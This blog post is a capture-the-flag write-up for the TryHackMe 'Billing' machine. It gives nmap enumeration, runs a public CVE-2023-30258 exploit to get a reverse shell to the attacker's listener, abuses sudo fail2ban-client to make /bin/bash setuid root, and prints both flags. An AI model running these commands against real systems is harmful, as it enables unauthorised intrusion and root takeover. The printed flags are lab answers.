---
layout: post
title: "TryHackMe Billing Writeup"
date: 2025-04-20 10:00:00 +0000
categories: [CTF, TryHackMe]
tags: [tryhackme, billing, walkthrough, hacking, ctf]
image:
  path: /assets/img/billing/billing.png
  alt: "Billing Machine"
---

## Overview

**Billing** is a TryHackMe machine focused on enumeration, web exploitation, and privilege escalation.

- Difficulty: Easy
- IP Address: `10.10.128.215`
- Creator: RunasRs

## Enumeration

We start with a basic Nmap scan:

```bash
nmap -sC -sV -oA billing 10.10.128.215
```

Results:
```
# Nmap 7.95 scan initiated Sat Apr 19 22:23:39 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -p- -oN nmap.txt -vvv 10.10.152.32
Nmap scan report for 10.10.128.215
Host is up, received user-set (0.064s latency).
Scanned at 2025-04-19 22:23:53 CEST for 26s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCukT/TLi8Po4V6OZVI6yhgSlTaANGLErWG2Hqz9UOxX3XXMFvRe0uivnYlcvBwvSe09IcHjC6qczRgRjdqQOxF2XHUIFBgPjNOR3mb1kfWg5jKAGun6+J9atS8z+5d6CZuv0YWH6jGJTQ1YS9vGNuFvE3coJKSBYtNbpJgBApX67tCQ4YKenrG/AQddi3zZz3mMHN6QldivMC+NCFp+PozjjoJgD4WULCElDwW4IgWjq64bL3Y/+Ii/PnPfLufZwaJNy67TjKv1KKzW0ag2UxqgTjc85feWAxvdWKVoX5FIhCrYwi6Q23BpTDqLSXoJ3irVCdVAqHfyqR72emcEgoWaxseXn2R68SptxxrUcpoMYUXtO1/0MZszBJ5tv3FBfY3NmCeGNwA98JXnJEb+3A1FU/LLN+Ah/Rl40NhrYGRqJcvz/UPreE73G/wjY8LAUnvamR/ybAPDkO+OP47OjPnQwwbmAW6g6BInnx9Ls5XBwULmn0ubMPi6dNWtQDZ0/U=
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBVI/7v4DHnwY/FkhLBQ71076mt5xG/9agRtb+vldezX9vOC2UgKnU6N+ySrhLEx2snCFNJGG0dukytLDxxKIcw=
|   256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII6ogE6DWtLYKAJo+wx+orTODOdYM23iJgDGE2l79ZBN
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
| http-title:             MagnusBilling
|_Requested resource was http://10.10.128.215/mbilling/
| http-robots.txt: 1 disallowed entry
|_/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql    syn-ack ttl 63 MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk syn-ack ttl 63 Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 19 22:24:19 2025 -- 1 IP address (1 host up) scanned in 39.52 seconds
```
Nmap finds four open ports:

- **22** (`SSH`)
- **80** (`HTTP`)
- **3306** (`MySQL`)
- **5038** (`Asterisk`)



Browsing to the IP reveals a login page.

## HTTP

![MagnusBilling](/assets/img/billing/MagnusBilling.png){: width="1200" height="600"}

By accessing the README.md file we can detect that it is running the version 7.x.x

![README](/assets/img/billing/MagnusREADME.png){: width="1200" height="600"}

## Getting a Shell

Searching for exploit for Magnus Billing v7.x.x I found this repo with an exploit that gives us a reverse shell on the victim.

{: .note }
**Exploit**: [Exploit](https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit) CVE-2023-30258

Clone the repo.
```bash
$ git clone https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit
$ cd CVE-2023-30258-magnus-billing-v7-exploit 
```
Set up a listener.
```bash
$ nc -lvnp 4444
```

Then run the script
```bash
$ python exploit.py -t 10.10.128.215 -a 10.9.2.102 -p 4444
```
And we get a reverse shell
![reverseShell](/assets/img/billing/revShell.png){: width="1200" height="600"}

Now I recommend upgrade the shell to avoid exiting it by mistake
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
$ stty raw -echo; fg
$ export SHELL=bash
```
### User flag
We can find the user flag in magnus' directory
```bash
$ cd /home/magnus/
$ cat user.txt
THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```

## Privilege Escalation

If we run `sudo -l` we can see that the user asterisk may run /usr/bin/fail2ban-client without password
![sudo-l](/assets/img/billing/sudo-l.png){: width="1200" height="600"}

`fail2ban-client` is the command-line tool to control Fail2Ban, which protects Linux systems from brute-force and malicious IPs. It allows you to check jail status, manually ban/unban IPs, and reload rules. Commonly used with services like SSH to block repeated failed login attempts.

Checking for running processes we see fail2ban-server is running as root
```bash
$ ps -aux | grep fail2ban
root         542  0.2  1.4 1167416 28108 ?       Ssl  06:27   0:20 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

It has 8 active jails
```bash
$ sudo /usr/bin/fail2ban-client status
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
```

Now we can modify the action `actionban` of the `asterisk-iptables` jail
```bash
$ sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
chmod +s /bin/bash
$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban
chmod +s /bin/bash
```

Time to ban an IP
```bash
$ sudo /usr/bin/fail2ban-client set asterisk-iptables banip 4.4.4.4
1
$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

## Root Flag

Now we just have to spawn a new shell 
```bash
$ /bin/bash -p

# id
uid=0(root) gid=0(root) groups=0(root),1001(asterisk)

# cat /root/root.txt
THM{33ad5b530e71a172648f424ec23fae60}
```
---

Thanks for reading!
